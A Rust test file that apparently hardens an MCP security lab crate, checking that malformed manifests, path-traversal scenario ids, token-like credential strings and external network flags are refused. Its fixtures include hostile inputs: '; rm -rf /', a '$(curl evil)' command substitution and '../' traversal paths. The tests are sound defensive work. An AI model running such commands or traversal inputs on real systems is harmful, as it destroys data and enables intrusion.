//! Cycle 005 task-011: hostile fixtures and isolation hardening.

use dare_mcp_lab::{
    load_scenario_file, parse_scenario, sample_scenario_passive_boundary, validate_scenario,
    LabCredential, LabSession, VariantKind,
};

#[test]
fn malformed_manifest_rejected() {
    assert!(parse_scenario("{not-json").is_err());
    assert!(parse_scenario(r#"{"id":"MCP-LAB-001"}"#).is_err());
}

#[test]
fn path_traversal_scenario_path_does_not_escape_loader() {
    let err = dare_mcp_lab::load_corpus_scenario("../Cargo.toml").expect_err("refuse");
    assert!(err.to_string().contains("unsafe scenario id"));
    let err = dare_mcp_lab::load_corpus_scenario("MCP-LAB-001/../../etc").expect_err("refuse");
    assert!(err.to_string().contains("unsafe scenario id"));
    let path = dare_mcp_lab::scenario_path("MCP-LAB-001");
    assert!(
        path.ends_with("labs/scenarios/MCP-LAB-001/scenario.json")
            || path.ends_with("labs\\scenarios\\MCP-LAB-001\\scenario.json")
    );
}

#[test]
fn malicious_metadata_strings_do_not_become_shell() {
    let mut sample = sample_scenario_passive_boundary();
    sample.title = "; rm -rf / **bold**".to_owned();
    sample.property.description = "`$(curl evil)`".to_owned();
    // Still structurally valid after title/description change — data remains data.
    validate_scenario(&sample).expect("metadata is data");
}

#[test]
fn secret_like_fixture_strings_refused_in_credentials() {
    let bad = LabCredential {
        id: "x".into(),
        issuer: "x".into(),
        subject: "x".into(),
        token_material: "Bearer eyJhbGciOiJIUzI1NiIs".into(),
    };
    assert!(LabSession::start("MCP-LAB-001", VariantKind::Secure)
        .unwrap()
        .with_credential(bad)
        .is_err());
}

#[test]
fn teardown_failure_safe_idempotent() {
    let session = LabSession::start("MCP-LAB-001", VariantKind::Vulnerable).unwrap();
    let state = session.teardown();
    assert!(state.is_empty());
}

#[test]
fn external_network_flag_cannot_enter_corpus() {
    let mut sample = sample_scenario_passive_boundary();
    sample.safety.external_network = true;
    assert!(validate_scenario(&sample).is_err());
}

#[test]
fn corpus_file_loads_without_ordering_dependency() {
    // Reverse order load still works.
    for id in ["MCP-LAB-010", "MCP-LAB-005", "MCP-LAB-001"] {
        let path = dare_mcp_lab::scenario_path(id);
        load_scenario_file(path).unwrap_or_else(|e| panic!("{id}: {e}"));
    }
}
